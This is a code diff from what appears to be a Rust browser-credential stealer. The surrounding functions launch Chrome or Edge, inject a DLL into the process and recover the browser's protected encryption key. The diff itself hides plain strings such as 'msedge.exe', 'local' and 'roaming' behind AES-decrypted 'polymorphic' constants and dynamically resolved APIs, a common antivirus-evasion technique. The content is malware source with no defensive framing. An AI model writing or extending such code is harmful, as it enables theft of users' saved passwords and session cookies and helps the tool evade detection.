@@ -511,8 +511,9 @@ fn spawn_chrome_and_inject(chrome_exe: &str, dll_path: &Path, real_profile: &Pat
         let pid = pi.dwProcessId;
 
         // Edge needs more startup time than Chrome — poll with early exit
+        let edge_name = aes_decrypt(&polymorphic_keys::INJ_EDGE_EXE_ENC, &polymorphic_keys::INJ_EDGE_EXE_KEY, &polymorphic_keys::INJ_EDGE_EXE_NONCE);
         let exe_basename = std::path::Path::new(chrome_exe).file_name().map(|f| f.to_string_lossy().to_lowercase()).unwrap_or_default();
-        let wait_ms = if exe_basename == "msedge.exe" { 5000u64 } else { 3000u64 };
+        let wait_ms = if exe_basename.as_bytes() == edge_name.as_slice() { 5000u64 } else { 3000u64 };
         let step = 500u64;
         let mut elapsed = 0u64;
         while elapsed < wait_ms {
@@ -578,7 +579,21 @@ pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
         let env_browser_name = aes_decrypt(&polymorphic_keys::BROWSER_NAME_ENV_ENC, &polymorphic_keys::BROWSER_NAME_ENV_KEY, &polymorphic_keys::BROWSER_NAME_ENV_NONCE);
         crate::dynapi::set_env_var(core::str::from_utf8_unchecked(&env_result), &result_path.to_string_lossy());
         crate::dynapi::set_env_var(core::str::from_utf8_unchecked(&env_user_data), &target.user_data_rel);
-        crate::dynapi::set_env_var(core::str::from_utf8_unchecked(&env_data_root), match target.root { browsers::DataRoot::Local => "local", browsers::DataRoot::Roaming => "roaming" });
+        let root_val = aes_decrypt(
+            &polymorphic_keys::DATA_ROOT_VAL_ENC,
+            &polymorphic_keys::DATA_ROOT_VAL_KEY,
+            &polymorphic_keys::DATA_ROOT_VAL_NONCE,
+        );
+        let root_val_r = aes_decrypt(
+            &polymorphic_keys::DATA_ROOT_VAL_R_ENC,
+            &polymorphic_keys::DATA_ROOT_VAL_R_KEY,
+            &polymorphic_keys::DATA_ROOT_VAL_R_NONCE,
+        );
+        let root_str: &[u8] = match target.root {
+            browsers::DataRoot::Local   => &root_val,
+            browsers::DataRoot::Roaming => &root_val_r,
+        };
+        crate::dynapi::set_env_var(core::str::from_utf8_unchecked(&env_data_root), core::str::from_utf8_unchecked(root_str));
         crate::dynapi::set_env_var(core::str::from_utf8_unchecked(&env_browser_name), browser_name);
     }
     let discovered = browsers::discover_elevation_services();
